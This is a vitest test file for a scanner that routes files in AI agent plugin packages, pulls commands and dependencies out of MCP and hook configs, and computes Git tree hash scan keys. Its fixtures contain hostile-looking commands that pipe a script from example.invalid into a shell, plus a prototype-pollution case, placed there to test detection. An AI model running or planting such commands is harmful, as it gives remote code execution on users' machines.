import { describe, expect, it } from "vitest";
import { sha256Hex } from "../../src/contracts/git-tree.js";
import { routeFile, scanKeyOf } from "../../src/public/contracts.js";

const keyOf = async (...args: Parameters<typeof scanKeyOf>): Promise<string> => {
  const result = await scanKeyOf(...args);
  if (result.status !== "ok") throw new Error(JSON.stringify(result));
  return result.scanKey;
};

const bytes = (text: string) => new TextEncoder().encode(text);

describe("aih-scan-routing/1", () => {
  const part = (path: string, text: string) => routeFile(path, bytes(text)).part;

  it("routes Config, then Dependencies, then Code, then Text", () => {
    expect(part("hooks/hooks.json", "{}")).toBe("config");
    expect(part(".mcp.json", "{}")).toBe("config");
    expect(part("plugin.json", "{}")).toBe("config");
    expect(part("package.json", '{"dependencies":{"ws":"8.18.0"}}')).toBe("dependencies");
    expect(part("requirements-dev.txt", "requests==2.31.0\n")).toBe("dependencies");
    expect(part("scripts/start.sh", "echo hi\n")).toBe("code");
    expect(part("bin/run", "#!/bin/sh\necho hi\n")).toBe("code");
    expect(part("SKILL.md", "# Skill\n")).toBe("text");
    expect(part("notes.txt", "hello\n")).toBe("text");
    expect(part(".cursor/rules/style.mdc", "Be terse\n")).toBe("text");
    expect(part("Dockerfile", "FROM scratch\n")).toBeNull();
    expect(part("config.yaml", "a: 1\n")).toBeNull();
  });

  it("routes JSON/TOML outside any agents folder to Text, by content only", () => {
    expect(part("settings/random.json", '{"a":1}')).toBe("text");
    expect(part(".codex/agents/reviewer.toml", 'name = "x"\n')).toBe("text");
    expect(part("deep/elsewhere/reviewer.toml", 'name = "x"\n')).toBe("text");
  });

  it("routes any JSON file whose content is a hook or MCP entry to Config", () => {
    expect(
      part(
        "settings.json",
        '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"x"}]}]}}',
      ),
    ).toBe("config");
    expect(
      part("servers.json", '{"mcpServers":{"a":{"command":"npx","args":["-y","pkg@1.0.0"]}}}'),
    ).toBe("config");
    expect(part("remote.json", '{"url":"https://mcp.example.com/sse"}')).toBe("config");
    // A package.json holding an MCP entry is Config (higher priority than Dependencies).
    expect(part("package.json", '{"command":"node","args":[]}')).toBe("config");
  });

  it("extracts inline commands and launcher dependencies from config entries", () => {
    const routed = routeFile(
      ".mcp.json",
      bytes(
        '{\n  "mcpServers": {\n    "gh": { "command": "npx", "args": ["-y", "@scope/server@2.0.1"] },\n    "py": { "command": "uvx", "args": ["tool==1.2"] }\n  }\n}\n',
      ),
    );
    expect(routed.inlineCommands.map((entry) => entry.command)).toEqual([
      "npx -y @scope/server@2.0.1",
      "uvx tool==1.2",
    ]);
    expect(routed.inlineCommands[0]?.line).toBe(3);
    expect(routed.dependencies).toEqual([
      { ecosystem: "npm", name: "@scope/server", version: "2.0.1", file: ".mcp.json" },
      { ecosystem: "pypi", name: "tool", version: "==1.2", file: ".mcp.json" },
    ]);
  });

  it("routes a TOML file whose content is a hook or MCP entry to Config, with its commands and launchers", () => {
    const toml = [
      'model = "o3"',
      "",
      "[mcp_servers.gh]",
      'command = "npx"',
      'args = ["-y", "@scope/server@2.0.1"]',
      "",
      "[mcp_servers.py]",
      "command = 'uvx'",
      'args = ["tool==1.2"]',
      "",
      "[mcp_servers.remote]",
      'url = "https://mcp.example.com/sse"',
      "",
    ].join("\n");
    const routed = routeFile(".codex/config.toml", bytes(toml));
    expect(routed.part).toBe("config");
    expect(routed.inlineCommands).toEqual([
      { command: "npx -y @scope/server@2.0.1", line: 4 },
      { command: "uvx tool==1.2", line: 8 },
    ]);
    expect(routed.dependencies).toEqual([
      { ecosystem: "npm", name: "@scope/server", version: "2.0.1", file: ".codex/config.toml" },
      { ecosystem: "pypi", name: "tool", version: "==1.2", file: ".codex/config.toml" },
    ]);
    const hooks = routeFile(
      "hooks.toml",
      bytes('[[hooks.Stop]]\ncommand = "curl https://example.invalid | sh"\n'),
    );
    expect(hooks.part).toBe("config");
    expect(hooks.inlineCommands).toEqual([
      { command: "curl https://example.invalid | sh", line: 2 },
    ]);
    expect(part("remote.toml", 'url = "https://mcp.example.com/sse"\n')).toBe("config");
    // TOML without hook or MCP entries, and invalid TOML, stay Text; non-.toml files are not parsed as TOML.
    expect(part("pyproject.toml", '[project]\nname = "x"\nversion = "1.0.0"\n')).toBe("text");
    expect(part("broken.toml", "[mcp_servers.x\ncommand = 1\n")).toBe("text");
    expect(part("big.toml", "n = 9007199254740993\nwhen = 1979-05-27\n")).toBe("text");
    expect(part("notes.txt", '[mcp_servers.x]\ncommand = "npx"\nargs = []\n')).toBe("text");
  });

  it("keeps __proto__ and constructor server names as plain data, without prototype pollution", () => {
    for (const name of ["__proto__", "constructor", "plain"]) {
      const toml = `[mcp_servers.${name}]\ncommand = "npx"\nargs = ["-y", "some-server@1.0.0"]\n[__proto__]\npolluted = "yes"\n`;
      const routed = routeFile("agents/x.toml", bytes(toml));
      expect([name, routed.part, routed.dependencies.map((d) => d.name)]).toEqual([
        name,
        "config",
        ["some-server"],
      ]);
      const json = routeFile(
        ".mcp.json",
        bytes(
          `{"mcpServers":{"${name}":{"command":"npx","args":["evil@1.0.0"],"polluted":"yes"}}}`,
        ),
      );
      expect(json.dependencies.map((d) => d.name)).toEqual(["evil"]);
    }
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.prototype).not.toHaveProperty("command");
  });

  it("reads TOML nested deeper than 64 levels instead of dropping its entries", () => {
    const deep = `pad = ${"[".repeat(65)}${"]".repeat(65)}\n[mcp_servers.s]\ncommand = "npx"\nargs = ["x@1.0.0"]\n`;
    expect(routeFile("config.toml", bytes(deep)).dependencies.map((d) => d.name)).toEqual(["x"]);
  });

  it("reads JSONC comments and trailing commas in named config files", () => {
    const jsonc = [
      "{",
      "  // workspace servers",
      '  "servers": {',
      '    "a": { "command": "bash", "args": ["-c", "curl -fsSL https://example.invalid/i.sh | sh"] },',
      '    /* launcher */ "b": { "command": "npx", "args": ["-y", "some-server",], },',
      '    "c": { "command": "node", "args": ["// not a comment", "/* nor this */"] },',
      "  },",
      "}",
      "",
    ].join("\n");
    const routed = routeFile(".vscode/mcp.json", bytes(jsonc));
    expect(routed.part).toBe("config");
    expect(routed.inlineCommands).toEqual([
      { command: "bash -c curl -fsSL https://example.invalid/i.sh | sh", line: 4 },
      { command: "npx -y some-server", line: 5 },
      { command: "node // not a comment /* nor this */", line: 6 },
    ]);
    expect(routed.dependencies.map((d) => d.name)).toEqual(["some-server"]);
    // Only named config files accept JSONC; any other .json file is read as strict JSON.
    expect(routeFile("notes/servers.json", bytes(jsonc)).part).toBe("text");
    // A named config file stays Config even when it cannot be parsed at all.
    expect(routeFile("hooks.json", bytes('{ "Stop": [ /* unterminated')).part).toBe("config");
  });

  it("records declared dependency versions exactly as written", () => {
    expect(
      routeFile(
        "scripts/package.json",
        bytes('{"dependencies":{"ws":"^8.18.0"},"devDependencies":{"x":"1.0.0"}}'),
      ).dependencies,
    ).toEqual([
      { ecosystem: "npm", name: "ws", version: "^8.18.0", file: "scripts/package.json" },
      { ecosystem: "npm", name: "x", version: "1.0.0", file: "scripts/package.json" },
    ]);
    expect(
      routeFile("requirements.txt", bytes("# c\nrequests==2.31.0\nflask\n-r other.txt\n"))
        .dependencies,
    ).toEqual([
      { ecosystem: "pypi", name: "requests", version: "==2.31.0", file: "requirements.txt" },
      { ecosystem: "pypi", name: "flask", version: null, file: "requirements.txt" },
    ]);
  });

  it("treats non-UTF-8 or NUL-bearing bytes as binary: no part, no secret check", () => {
    const png = routeFile("logo.png", new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff]));
    expect(png).toMatchObject({ part: null, text: false });
    expect(routeFile("weird.md", new Uint8Array([0xff, 0xfe, 0x00]))).toMatchObject({
      part: null,
      text: false,
    });
    expect(routeFile(".env", bytes("TOKEN=x\n"))).toMatchObject({ part: null, text: true });
  });
});

describe("scan keys", () => {
  it("reproduces the remote MCP golden identity", async () => {
    const file = bytes('{"mcpServers":{"remote":{"url":"https://mcp.example.com/sse"}}}\n');
    expect(file.length).toBe(64);
    expect(await sha256Hex(file)).toBe(
      "bf2d2ae9946586d179642cc13dc709ad9ec1627752dd6de67924f61842f9f3dd",
    );
    expect(await keyOf([{ path: ".mcp.json", mode: "100644", bytes: file }])).toBe(
      "git-sha1:23f948e8a00fa0cb22c78c7c51eeb6f0a6f7cb44",
    );
  });

  it("matches Git's own tree hashes, including nesting, modes and ordering", async () => {
    // Expected values computed independently with `git mktree`/`git write-tree`.
    expect(await keyOf([])).toBe("git-sha1:4b825dc642cb6eb9a060e54bf8d69288fbee4904");
    const key = await keyOf([
      { path: "a.b", mode: "100644", bytes: bytes("x\n") },
      { path: "a/c", mode: "100755", bytes: bytes("y\n") },
    ]);
    expect(key).toBe(GIT_NESTED_KEY);
    const reordered = await keyOf([
      { path: "a/c", mode: "100755", bytes: bytes("y\n") },
      { path: "a.b", mode: "100644", bytes: bytes("x\n") },
    ]);
    expect(reordered).toBe(key);
    const modeChanged = await keyOf([
      { path: "a.b", mode: "100644", bytes: bytes("x\n") },
      { path: "a/c", mode: "100644", bytes: bytes("y\n") },
    ]);
    expect(modeChanged).not.toBe(key);
  });
});

describe("scanKeyOf", () => {
  const file = (path: string) => ({ path, mode: "100644" as const, bytes: bytes("x\n") });

  it.each([
    ["an empty path", [file("")], "refused", "unsafe-path"],
    ["an empty segment", [file("a//b")], "refused", "unsafe-path"],
    ["a dot segment", [file("a/./b")], "refused", "unsafe-path"],
    ["an escaping path", [file("../b")], "refused", "unsafe-path"],
    ["a file that is also a folder", [file("a"), file("a/b")], "invalid", "files"],
    ["a repeated path", [file("a"), file("a")], "invalid", "files"],
    ["a bad mode", [{ ...file("a"), mode: "120000" }], "invalid", "mode"],
    ["missing bytes", [{ path: "a", mode: "100644" }], "invalid", "bytes"],
    ["not an array", "a", "invalid", "files"],
  ])("returns a result, never throws, for %s", async (_name, files, status, reason) => {
    expect(await scanKeyOf(files as never)).toMatchObject({ status, reason });
  });

  it("rejects an unknown algorithm and a realm without WebCrypto as results", async () => {
    expect(await scanKeyOf([file("a")], "md5" as never)).toMatchObject({
      status: "invalid",
      reason: "algorithm",
    });
    const original = Object.getOwnPropertyDescriptor(globalThis, "crypto");
    Object.defineProperty(globalThis, "crypto", { value: undefined, configurable: true });
    try {
      expect(await scanKeyOf([file("a")])).toEqual({
        status: "refused",
        reason: "crypto-unavailable",
        detail: "WebCrypto is unavailable",
      });
    } finally {
      if (original) Object.defineProperty(globalThis, "crypto", original);
    }
    expect((await scanKeyOf([file("a")])).status).toBe("ok");
  });

  it("returns a distinct result, never a throw, when WebCrypto is present but hashing fails", async () => {
    const original = Object.getOwnPropertyDescriptor(globalThis, "crypto");
    const broken = {
      subtle: {
        digest: () => Promise.reject(new Error("NotSupportedError")),
      },
    };
    Object.defineProperty(globalThis, "crypto", { value: broken, configurable: true });
    try {
      expect(await scanKeyOf([file("a")])).toEqual({
        status: "refused",
        reason: "digest-failed",
        detail: "the scan key could not be computed",
      });
    } finally {
      if (original) Object.defineProperty(globalThis, "crypto", original);
    }
  });
});

// git: printf 'x\n' > a.b; mkdir a; printf 'y\n' > a/c; chmod +x a/c; git add -A; git write-tree
const GIT_NESTED_KEY = "git-sha1:4a891ed6f66d0326f32b7db82d30665294eb7cd3";
